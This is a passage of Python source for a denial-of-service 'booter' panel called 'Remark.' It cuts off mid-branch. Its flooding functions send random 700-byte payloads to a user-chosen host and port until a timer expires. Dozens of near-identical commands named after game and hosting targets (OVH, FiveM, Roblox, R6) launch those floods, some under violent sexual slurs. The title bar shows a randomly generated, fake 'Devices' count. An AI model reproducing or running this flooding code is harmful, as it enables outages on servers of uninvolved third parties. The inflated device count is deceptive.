╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ 
[95m║            [91m1           [95m║ 
╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝ 
╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ 
[95m║  [91m.tempest-test         [95m║ 
[95m║  [91m.telnet               [95m║ 
[95m║  [91m.100up-path           [95m║ 
[95m║  [91m.path-kill            [95m║  
[95m║  [91m.path-kill-all        [95m║                            
╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╝                        
"""

banner =  """
  [00mRemark. [Alpha].
  [00mIn collaboration, ek X fallout.
  [00mOur Power Will OverWhelm And Destroy.
  [00mJuly 18th, 2022
"""



cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(3250,4150))
		sys.stdout.write("\x1b]2;Remark. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("~ ".format(nicknm)).lower() # yk
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()                            
		elif sinput == "strength":
			os.system ("clear")
			print (strength)
			main()           
		elif sinput == "vip":
			os.system ("clear")
			print (vip)
			main()
		elif sinput == "hub":
			os.system ("clear")
			print (hub)
			main()
		elif sinput == "ovh":
			os.system ("clear")
			print (ovh)
			main()
		elif sinput == "nfo":
			os.system ("clear")
			print (nfo)
			main()
		elif sinput == "hydra":
			os.system ("clear")
			print (hydra)
			main()
		elif sinput == "path":
			os.system ("clear")
			print (path)
			main()
		elif sinput == "help":
			os.system ("clear")
			print (help)
			main()       
		elif sinput == "fallout":
			os.system ("clear")
			print (fallout)
		elif sinput == "vector":
			os.system ("clear")
			print (vector)
			main() 
		elif sinput == "bypass":
			os.system ("clear")
			print (bypass)
			main()                
		elif sinput == "game":
			os.system ("clear")
			print (game)
			main()       
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == ".witch":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".home":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".osiris":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".kratos":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".odin":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".oryx":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".phoenix":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".gunther":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".massacre":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".killall":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp-all":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".MAG-7":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".AK-47":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".wsx":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".xtv":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()

		elif sinput == ".strm":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".vse-gain":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".std-gain":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".udp-gain":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".cpu-vector":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".vector-esp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".esp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".anycast":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovary":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".oval":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".gator":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".bite":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".panther":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".reroute":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp-flash":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".shogun":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".beretta":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hex-c":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".yell":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".syn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ldap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".mgp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fn-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fn-rape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fn-smack":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fn-rain":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".apex-xv":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".apex-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".apex-rape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".rank-lag":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "..r6-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".r6-rape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".roblox-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".roblox-tech":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".roblox-rape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem-null":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()

		elif sinput == ".fivem-slap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem-vse":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem-etc":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem-ovh":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".vse-x":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".vse-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".universal":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-fly":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-xv":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".k.o":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-syn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".bite":
			try:
